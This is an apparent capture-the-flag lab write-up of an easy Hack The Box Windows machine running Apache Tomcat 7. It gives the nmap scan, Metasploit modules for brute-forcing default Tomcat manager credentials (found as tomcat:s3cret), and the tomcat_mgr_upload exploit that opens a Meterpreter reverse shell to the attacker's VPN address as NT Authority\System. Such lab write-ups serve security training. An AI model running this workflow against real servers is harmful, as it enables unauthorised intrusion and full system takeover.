---
tags:
  - Windows
  - HTTP
  - Tomcat
  - Weak credentials
---

... is a very easy HTB machine which offers a `http` service based on `Apache Tomcat`. It is possible to log-in with default `Tomcat` credentials and receive a shell using the `Tomcat Manager Upload` as `NT Authority\System`!

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```
The web-page on `http://$IP:8080` displays the default page for `Apache Tomcat`.

### Initial Exploitation
The most common attack scenario in older `Tomcat` instances is to try default credentials, as logging into `Tomcat` allows you to upload arbitrary `Java` code, which leads to `RCE`!.

The easiest way to try all combinations of `Tomcat` default credentials is the module `auxiliary/scanner/http/tomcat_mgr_login` of the `msfconsole`. This is the typical workflow of using it:
```bash
msfconsole # starts metasploit's console
use auxiliary/scanner/http/tomcat_mgr_login # uses this module
set RHOSTS <target-IP> # set the IP of the target
run # execute the brute-force
```
The login is successful with the credentials `tomcat:s3cret`!

To abuse the `Tomcat Manager Upload` functionality, it is possible to do it manually, but as `msfconsole` is already running, the module `exploit/multi/http/tomcat_mgr_upload` can be used to instantly receive a `Meterpreter` (more powerful reverse shell). The workflow for that looks as follows:
```bash
msfconsole # starts metasploit's console
use exploit/multi/http/tomcat_mgr_upload # uses this module
set RHOSTS <target-IP> # set the IP of the target
set RPORT 8080 # defaults to 80 for whatever reason
set HttpUsername tomcat # set the username i have found
set HttpPassword s3cret # set the password i have found
set LHOST tun0 # Listen on VPN-IP not local ip!
run # start the exploit!
```

Within the `meterpreter >` session i can execute the command `shell` to get a `shell` on the system!

I navigate to `C:\Users\Administrator\Desktop\flags`, where i can issue the command `type "2 for the price of 1.txt"` to get the `user.txt` and the `root.txt` at the same time! `whoami` reveals that i have a shell as `NT Authority\System` which is the highest possible privilege on a `Windows` machine, so the `Lateral Movement` and `Privilege Escalation` paths become unnecessary. 